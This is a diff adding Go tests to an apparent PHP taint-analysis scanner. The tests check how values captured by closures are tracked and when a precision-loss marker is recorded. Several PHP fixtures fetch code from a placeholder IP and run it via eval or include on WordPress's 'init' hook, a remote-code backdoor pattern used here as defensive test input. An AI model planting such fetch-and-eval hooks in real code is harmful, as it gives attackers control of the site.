@@ -885,3 +885,99 @@ func TestResultsAreDeterministic(t *testing.T) {
 		}
 	}
 }
+
+var (
+	fxCaptureTainted = b64(`<?php
+$payload = file_get_contents('http://198.51.100.7/x');
+add_action('init', function() use ($payload) { eval($payload); });`)
+
+	fxCaptureTaintedArrow = b64(`<?php
+$payload = file_get_contents('http://198.51.100.7/x');
+add_action('init', fn() => eval($payload));`)
+
+	// The local include is a sink that no tainted value reaches. Without a
+	// sink the pre-filter rejects the file outright and the analyzed path
+	// this test is about never runs.
+	fxCaptureClean = b64(`<?php
+$payload = 'local literal';
+$unused = curl_exec($c);
+include __DIR__ . '/parts/header.php';
+add_action('init', function() use ($payload) { echo $payload; });`)
+
+	fxCaptureParamShadow = b64(`<?php
+$payload = file_get_contents('http://198.51.100.7/x');
+add_action('init', function($payload) { include $payload; });`)
+
+	fxCaptureThenReassign = b64(`<?php
+$payload = file_get_contents('http://198.51.100.7/x');
+add_action('init', function() use ($payload) { $payload = 'safe.php'; include $payload; });`)
+)
+
+// TestClosureCaptureOfTaintedValueIsRecorded pins the package's own contract:
+// scoping a closure's body keeps an unrelated same-named outer variable from
+// firing on clean code, but it also means a value the closure genuinely does
+// receive through use() stops being tracked at the boundary. That is a real
+// reduction in coverage, and this package treats an unrecorded reduction as a
+// silent false negative rather than an acceptable trade.
+func TestClosureCaptureOfTaintedValueIsRecorded(t *testing.T) {
+	for _, tc := range []struct{ name, fixture string }{
+		{"use clause", fxCaptureTainted},
+		{"arrow function", fxCaptureTaintedArrow},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			rep := run(t, tc.fixture)
+			if rep.Status != StatusAnalyzed {
+				t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
+			}
+			if !slices.Contains(rep.PrecisionLoss, "closure-capture") {
+				t.Fatalf("precision loss = %v, want it to record closure-capture", rep.PrecisionLoss)
+			}
+		})
+	}
+}
+
+// TestClosureCaptureOfCleanValueIsNotRecorded is the gate that keeps the
+// marker worth reading. Capturing is ordinary PHP -- a use() clause or an
+// arrow function appears in 14.6% of the files this analyzer looks at -- so a
+// marker raised on the shape alone would fire on roughly one analyzed file in
+// seven and tell an operator nothing. It is raised only when the captured
+// value was actually tainted, i.e. only when taint really was dropped.
+func TestClosureCaptureOfCleanValueIsNotRecorded(t *testing.T) {
+	rep := run(t, fxCaptureClean)
+	if rep.Status != StatusAnalyzed {
+		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
+	}
+	if slices.Contains(rep.PrecisionLoss, "closure-capture") {
+		t.Fatalf("precision loss = %v, want no closure-capture for an untainted capture", rep.PrecisionLoss)
+	}
+}
+
+// TestClosureParameterIsNotACapture separates the two ways an outer name can
+// reappear inside a closure. A parameter that happens to share an outer
+// variable's name is the closure's OWN binding and receives nothing from the
+// enclosing scope, so nothing is dropped and nothing is reported. Treating it
+// as a capture would both raise a useless marker and re-open the shadowing
+// false positive that scoping closures exists to prevent.
+func TestClosureParameterIsNotACapture(t *testing.T) {
+	rep := run(t, fxCaptureParamShadow)
+	if len(rep.Results) != 0 {
+		t.Fatalf("results = %+v, want none for a shadowing parameter", rep.Results)
+	}
+	if slices.Contains(rep.PrecisionLoss, "closure-capture") {
+		t.Fatalf("precision loss = %v, want no closure-capture for a parameter", rep.PrecisionLoss)
+	}
+}
+
+// TestCaptureThenReassignStaysClean guards the false positive that rules out
+// seeding captured taint into the body. The include reads a local literal, so
+// the file is clean and must report no result. The capture itself is still a
+// real drop and is still recorded.
+func TestCaptureThenReassignStaysClean(t *testing.T) {
+	rep := run(t, fxCaptureThenReassign)
+	if len(rep.Results) != 0 {
+		t.Fatalf("results = %+v, want none when the capture is reassigned before use", rep.Results)
+	}
+	if !slices.Contains(rep.PrecisionLoss, "closure-capture") {
+		t.Fatalf("precision loss = %v, want the dropped capture still recorded", rep.PrecisionLoss)
+	}
+}
